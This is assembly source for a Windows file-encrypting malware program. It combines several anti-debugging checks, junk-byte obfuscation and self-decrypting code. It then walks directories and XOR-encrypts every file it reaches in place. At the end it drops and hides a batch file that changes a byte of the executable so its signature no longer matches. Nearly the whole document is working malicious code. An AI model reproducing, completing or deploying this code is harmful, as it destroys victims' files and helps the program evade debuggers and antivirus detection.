include \masm32\include\masm32rt.inc
include \masm32\include\ntdll.inc
include \masm32\include\advapi32.inc
includelib \masm32\lib\advapi32.lib
includelib \masm32\lib\ntdll.lib

.data
    inp      db         256 dup(?)
    w32fd WIN32_FIND_DATA <>
    file_handle HANDLE ?
    newline db 13, 10, 0
    file_ext db "*.*"
    counter dd 0
    buffer db 256 dup(?) ;
    subbuffer db 256 dup(?) ; 
    dot db ".", 0
    dotdot db "..", 0
    noti     db      "Done Subfolder, Now Back To Parent Directory",13,10,0
    invalidInp      db      "Invalid Direction, Working On Current Direction: ",0
    inputNoti   db      "Type your direction with a \ (For example: C:\ ):  ", 0
    endNoti     db      "Done! All files have been printed in the directory: ", 0
    zzzzz       db "   - Encrypted",0
    ;for helo
    dir         db 256 dup(?)
    sergh       db  "\",0
    file_size dd ?
    hHeap       HANDLE ?
    lpMem       DWORD ?
    file_handle1    HANDLE ?
    bytes_read  db ?
    bytes_written   db ?
    blank db 256 dup(?)

    ;for signature change
    batFileName db "run.bat",0
    batFileContent db '@echo off', 13, 10, 13, 10, \
                  'set file=release.exe', 13, 10, 13, 10, \
                  'powershell -Command "& { $content = Get-Content -Path ''%file%'' -Encoding Byte; $lastByte = $content[-1]; if ($lastByte -eq 0) { $content += 0xFF } else { $content[-1] = $lastByte - 1 }; [System.IO.File]::WriteAllBytes(''%file%'', $content) }"', 13, 10, 13, 10, \
                  'timeout /t 1 /nobreak >nul',13,10,13,10,\
                  'del run.bat'               
    bytesWritten dd ?

    ;for anti debug
    AppName db "NULL"
    MsgBoxText          db "Windows debugger detected!",0
    MsgBoxTitle         db "Debugger detected!",0
    MsgBoxTextNot       db "Windows debugger not detected!",0
    MsgBoxTitleNot      db "Perfect!",0


    

.code

start:

    JUNKBYTE MACRO
	db	0cch, 0feh, 0ebh, 00h
ENDM

    ;NtGlobalFlag - PEB!NtGlobalFlags
    xor eax, eax
    assume fs:nothing
    mov eax, fs:[eax+30h]
    mov eax, [eax+68h]
    and eax, 70h
    db 0ebh, 01h
    db 0ffh, 085h, 0C0h ;junk byte - test eax, eax
    jne @Detected
    
    ;obfuscation
    db 0ebh, 02h
    JUNKBYTE

    ;IsDebuggerPresent first - kernel32!IsDebuggerPresent
    call IsDebuggerPresent
    call @eip_manipulate ; change eip (point to next instruction)
    mov eax, 010h
    cmp eax, 1
    je @Detected
    
    ;IsDebuggerPresent second - PEB!IsDebugged
    xor eax, eax
    assume fs:nothing
    mov eax, fs:[18h]
    mov eax, DWORD PTR ds:[eax+30h]
    movzx eax, BYTE PTR ds:[eax+2h]
    test eax, eax
    jne @Detected

    ;software breakpoint detection into MessageBox API
    cld
    mov edi, offset @Detected
    mov ecx, 013h 
    mov al,0cch
    repne scasb
    jz @Detected
    
    ;hardware breakpoint detection
    assume fs:nothing
    push offset HwBpHandler
    push fs:[0]
    mov DWORD PTR fs:[0], esp
    xor eax, eax
    div eax
    pop DWORD PTR fs:[0]
    add esp, 4
    test eax, eax
    jnz @Detected

    ;get write permissions for self-modifying code
    xor esi, esi
    xor ecx, ecx
    mov esi, offset @encrypted_code
    push esp
    push PAGE_EXECUTE_READWRITE
    push 04h
    push esi
    call VirtualProtect
    
    ;self-modifying code
    mov eax, 1234h   ;key
    mov ecx, offset @encrypted_code
    
    @loop_decryption:
    xor [ecx], al ;very simple algorithm
    inc ecx
    cmp ecx, @encrypted_code + 04h
    jnz @loop_decryption
    
    @encrypted_code:
    db 05eh, 04h  ;push 30h
    db 0dfh, 34h  ;jmp at next instruction 

    jmp find_first_file

@Detected:
push 30h
push offset MsgBoxTitle
push offset MsgBoxText
push 0
call MessageBox
jmp @Exit

@Exit:
push 0
call ExitProcess

@eip_manipulate:
add dword ptr [esp], 5
ret


find_first_file:

    ;set direction as input
    invoke SetCurrentDirectory, offset inp
    invoke GetCurrentDirectory, sizeof buffer, offset buffer
    
    invoke StdOut, offset buffer
    invoke StdOut, offset newline
    push offset w32fd
    push offset file_ext
    call FindFirstFile

    mov file_handle, eax

find_next_file:


    ;Remove .
    push offset w32fd.cFileName
    push offset dot
    call crt__stricmp
    .if eax == 0
        push offset w32fd
        push file_handle
        call FindNextFile
        jmp  find_next_file
    .endif

 
   ;Remove  
    push offset w32fd.cFileName
    push offset dotdot
    call crt__stricmp
    .if eax == 0
        push offset w32fd
        push file_handle
        call FindNextFile
        jmp  find_next_file
    .endif    


    ; Get the file attributes using GetFileAttributes
    push offset w32fd.cFileName
    call GetFileAttributes
    .if eax == FILE_ATTRIBUTE_DIRECTORY || eax == FILE_ATTRIBUTE_SYSTEM || eax == FILE_ATTRIBUTE_HIDDEN
        
        invoke SetCurrentDirectory, offset w32fd.cFileName
        call sub_directory          ;get into subfolder
        invoke StdOut, offset noti
        invoke SetCurrentDirectory, offset buffer
        xor eax, eax                ;renew eax
        push offset w32fd
        push file_handle
        call FindNextFile
        invoke StdOut, offset w32fd.cFileName
        jmp find_next_file
    .endif

    invoke GetCurrentDirectory, sizeof dir, offset dir
    invoke lstrcat, offset dir, offset sergh
    invoke lstrcat, offset dir, offset w32fd.cFileName
    call helo
    invoke lstrcpy, offset dir, offset blank
    invoke StdOut, offset newline
        
   
    
    ;prepare argument for FindNextFile
    push offset w32fd
    push file_handle
    call FindNextFile
    cmp eax, 0
    jne find_next_file
    
    invoke StdOut, offset newline
    invoke StdOut, offset endNoti
    invoke StdOut, offset buffer

    ;signature change
    invoke CreateFile, addr batFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    mov ebx, eax ; save file handle
  
    invoke WriteFile, ebx, addr batFileContent, sizeof batFileContent, offset bytesWritten, NULL
  
    ; Close the file handle
    invoke CloseHandle, ebx
    invoke WinExec, addr batFileName, SW_HIDE
    invoke ExitProcess, 0





sub_directory PROC
  LOCAL sub_irectory   :HANDLE
  LOCAL sub_w32fd      :WIN32_FIND_DATA

sub_find_first_file:
  mov counter, 0
  invoke FindFirstFile, offset file_ext, addr sub_w32fd
  mov sub_irectory, eax
  

sub_find_next_file:
   
    .if counter == 5            ;handle blank folder
       ret
     .endif
     
    ;Handle "."
    lea eax, [sub_w32fd.cFileName]
    push eax
    push offset dot
    call crt__stricmp
    .if eax == 0
    inc counter
    lea eax, [sub_w32fd]
        push eax
        push sub_irectory
        call FindNextFile   
        jmp  sub_find_next_file
    .endif
    
    
   ;Handle ".."
    lea eax, [sub_w32fd.cFileName]
    push eax
    push offset dotdot
    call crt__stricmp
    .if eax == 0
    inc counter
    print str$(counter)
    lea eax, [sub_w32fd]
        push eax
        push sub_irectory
        call FindNextFile
        jmp  sub_find_next_file
    .endif

  ; Check if it's a directory or a system/hidden file
    invoke GetFileAttributes, addr sub_w32fd.cFileName
  .if eax == FILE_ATTRIBUTE_DIRECTORY || eax == FILE_ATTRIBUTE_SYSTEM || eax == FILE_ATTRIBUTE_HIDDEN
        lea edx, [sub_w32fd.cFileName]
        invoke SetCurrentDirectory, edx    
        call sub_directory 
        mov counter ,0 
        invoke SetCurrentDirectory, offset dotdot
        lea edx, [sub_w32fd]
        push edx
        push sub_irectory
        call FindNextFile
        
        ;jmp sub_find_next_file

    .endif
  
  invoke GetCurrentDirectory, sizeof dir, offset dir
  invoke lstrcat, offset dir, offset sergh
  invoke lstrcat, offset dir, addr sub_w32fd.cFileName
  call helo
  invoke lstrcpy, offset dir, offset blank
  invoke StdOut, offset newline

  
  ; Find the next file
  lea eax, [sub_w32fd]
  push eax
  push sub_irectory
  call FindNextFile
  cmp eax, 0
  jne sub_find_next_file    
  invoke CloseHandle, sub_irectory    
  ret
sub_directory ENDP

helo PROC    
 
    invoke StdOut, offset dir

    
create_file:

    push 0
    push FILE_ATTRIBUTE_NORMAL
    push OPEN_EXISTING
    push 0
    push 0
    push FILE_READ_DATA
    push offset dir
    call CreateFileA
    mov file_handle1, eax

    .if eax == INVALID_HANDLE_VALUE
    ret
    .endif

invoke GetFileSize, file_handle1, 0
mov file_size, eax

read_file:

   invoke HeapCreate, HEAP_GENERATE_EXCEPTIONS, 0, 0
   mov hHeap, eax
   invoke HeapAlloc, eax, HEAP_GENERATE_EXCEPTIONS, file_size
   mov lpMem, eax
   mov esi, eax ; Save the pointer to the buffer
   
   invoke ReadFile, file_handle1, lpMem, file_size, addr bytes_read, 0    
   invoke CloseHandle, file_handle1

    invoke CreateFile, addr dir, GENERIC_WRITE, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
    mov ebx, eax ; save the file handle

    mov esi, lpMem ; Load the pointer to the buffer
   

encrypt_loop:

    movzx eax, BYTE PTR [esi] ; Load a byte from the buffer
    cmp eax, NULL
    je done
    xor eax, 3 ; XOR it with the key (3 in this case)
    mov BYTE PTR [esi], al ; Store the encrypted byte in the encrypted buffer
    
    ; Write the encrypted byte to the file
    invoke WriteFile, ebx, esi, 1, addr bytes_written, 0
    ; Check for errors if necessary

    inc esi ; Move to the next byte in the encrypted buffer
    
    jmp encrypt_loop ; Repeat for the entire buffer


done:
invoke HeapDestroy, hHeap
invoke StdOut, offset zzzzz
invoke CloseHandle, ebx    

   
    ret

helo ENDP


HwBpHandler proc 
     xor eax, eax
     mov eax, [esp + 0ch]         ; This is a CONTEXT structure on the stack
     cmp DWORD PTR [eax + 04h], 0 ; Dr0
     jne bpFound
     cmp DWORD PTR [eax + 08h], 0 ; Dr1
     jne bpFound
     cmp DWORD PTR [eax + 0ch], 0 ; Dr2
     jne bpFound
     cmp DWORD PTR [eax + 10h], 0 ; Dr3
     jne bpFound
     jmp retFromException
     
bpFound:
    mov DWORD PTR [eax + 0b0h], 0ffffffffh ; HW bp found

retFromException:
    add DWORD PTR [eax + 0b8h], 6
    xor eax, eax
    ret

HwBpHandler endp


end start
